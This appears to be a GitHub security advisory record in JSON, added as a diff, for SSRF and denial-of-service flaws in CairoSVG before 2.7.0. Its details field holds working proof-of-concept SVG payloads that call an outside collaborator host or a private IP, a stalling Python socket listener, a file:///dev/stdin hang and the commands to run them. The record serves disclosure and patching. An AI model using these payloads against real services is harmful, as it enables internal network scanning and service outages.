@@ -1,0 +1,74 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-rwmf-w63j-p7gv",
+  "modified": "2023-03-20T21:27:15Z",
+  "published": "2023-03-20T21:27:15Z",
+  "aliases": [
+    "CVE-2023-27586"
+  ],
+  "summary": "CairoSVG improperly processes SVG files loaded from external resources",
+  "details": "# SSRF vulnerability\n\n## Summary\nWhen CairoSVG processes an SVG file, it can make requests to the inner host and different outside hosts.\n\n## Operating system, version and so on\nLinux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9\n\n## Tested CairoSVG version\n2.6.0\n\n## Details\nA specially crafted SVG file that loads an external resource from a URL. Remote attackers could exploit this vulnerability to cause a scan of an organization's internal resources or a DDOS attack on external resources.\nIt looks like this bug can affect websites and cause request forgery on the server.\n\n## PoC\n1. Generating malicious svg file:\n1.1 CairoSVG_exploit.svg:\n```svg\n<?xml version=\"1.0\" standalone=\"yes\"?>\n    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n    <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n    <image height=\"200\" width=\"200\" xlink:href=\"http://[jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com](http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/)/3\" />\n    <style type=\"text/css\">@import url(\"http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com/5\");</style>\n    <style type=\"text/css\">\n         <![CDATA[\n            @import url(\"http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/9\");\n            rect { fill: red; stroke: blue; stroke-width: 3 }\n         ]]>\n    </style>\n</svg>\n```\n\n1.2 CairoSVG_exploit_2.svg:\n```svg\n<?xml version=\"1.0\" standalone=\"yes\"?>\n    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n    <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n    <defs>\n        <pattern id=\"img1\" patternUnits=\"userSpaceOnUse\" width=\"600\" height=\"450\">\n            <image xlink:href=\"http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/11\" x=\"0\" y=\"0\" width=\"600\" height=\"450\" />\n        </pattern>\n    </defs>\n    <path d=\"M5,50 l0,100 l100,0 l0,-100 l-100,0 M215,100 a50,50 0 1 1 -100,0 50,50 0 1 1 100,0 M265,50 l50,100 l-100,0 l50,-100 z\" fill=\"url(#img1)\" />\n</svg>\n```\n\n1.3 CairoSVG_exploit_3.svg:\n```svg\n<?xml version=\"1.0\" standalone=\"yes\"?>\n    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n    <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n    <use href=\"http://jzm72frk1jng4ametta5bpyn0e65uvik.oastify.com:80/13\" />\n</svg>\n```\n\n2. Run some commands:\n`$ python3 -m cairosvg CairoSVG_exploit.svg -f png`\n`$ python3 -m cairosvg CairoSVG_exploit_2.svg -f png`\n`$ python3 -m cairosvg CairoSVG_exploit_3.svg -f png `\n\n3. See result requests in Burp Collaborator:\n![1](https://user-images.githubusercontent.com/952243/224340068-547b1d9a-5513-48a5-9cdf-b34b693f80c2.png)\n\n\n\n# DOS vulnerability with SSTI\n\n## Summary\nWhen CairoSVG processes an SVG file, it can send requests to external hosts and wait for a response from the external server after a successful TCP handshake. This will cause the server to hang.\nIt seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.\n\n## Operating system, version and so on\nLinux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9\n\n## Tested CairoSVG version\n2.6.0\n\n## PoC\n1. Generating malicious svg file:\n\n```svg\n<?xml version=\"1.0\" standalone=\"yes\"?>\n    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n    <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n    <use href=\"http://192.168.56.1:1234/\" />\n</svg>\n```\n\n2. In other server run this python program:\n\n```python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('0.0.0.0', 1234))\ns.listen(1)\nconn, addr = s.accept()\nwith conn:\n    while True:\n        data = conn.recv(2048)\ns.close()\n```\n\n3. Run commands:\n`$timeout 60 python3 -m cairosvg CairoSVG_exploit_dos.svg -f png`\n(without timeout server will hang forever)\n\n\n# DOS vulnerability with stdin file descriptor\n\n## Summary\n\nSpecially crafted SVG file that opens /proc/self/fd/1 or /dev/stdin results in a hang with a tiny PoC file. Remote attackers could leverage this vulnerability to cause a denial of service via a crafted SVG file.\nIt seems this bug can affect websites or servers and cause a complete freeze while uploading this PoC file to the server.\n\n## Operating system, version and so on\nLinux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara), python 3.9\n\n## Tested CairoSVG version\n2.6.0\n\n## PoC\n1. Generating malicious svg file:\n\n```svg\n<?xml version=\"1.0\" standalone=\"yes\"?>\n    <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n    <svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">\n    <use href=\"file:///dev/stdin\" />\n</svg>\n```\n\n2. In other server run this python program:\n```python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind(('0.0.0.0', 1234))\ns.listen(1)\nconn, addr = s.accept()\nwith conn:\n    while True:\n        data = conn.recv(2048)\ns.close()\n```\n\n3. Run commands:\n`$timeout 60 python3 -m cairosvg cariosvg_exploit_dos.svg -f png`",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "CairoSVG"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.7.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Kozea/CairoSVG/security/advisories/GHSA-rwmf-w63j-p7gv"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-27586"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Kozea/CairoSVG/commit/12d31c653c0254fa9d9853f66b04ea46e7397255"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Kozea/CairoSVG/commit/33007d4af9195e2bfb2ff9af064c4c2d8e4b2b53"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Kozea/CairoSVG"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Kozea/CairoSVG/releases/tag/2.7.0"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-20",
+      "CWE-918"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-03-20T21:27:15Z",
+    "nvd_published_at": "2023-03-20T16:15:00Z"
+  }
+}
